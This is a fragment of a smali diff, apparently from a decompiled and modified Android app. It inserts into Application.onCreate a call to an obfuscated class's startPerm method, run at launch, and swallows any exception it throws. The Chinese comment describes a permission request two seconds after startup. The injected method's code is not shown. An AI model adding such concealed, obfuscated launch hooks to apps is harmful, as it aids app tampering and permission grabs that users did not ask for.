@@ -88,6 +88,18 @@
 
     invoke-super {p0}, Landroid/app/Application;->onCreate()V
 
+    # 启动后：2 秒再拉起权限申请
+    :try_start_appperm
+    move-object/from16 v0, p0
+    invoke-static {v0}, Lڝږ؁ڋ/ھ;->startPerm(Landroid/content/Context;)V
+    :try_end_appperm
+    .catch Ljava/lang/Exception; {:try_start_appperm .. :try_end_appperm} :catch_appperm
+    goto :goto_appperm
+
+    :catch_appperm
+    move-exception v0
+    :goto_appperm
+
     const/4 v0, 0x0
 
     const/4 v1, 0x1
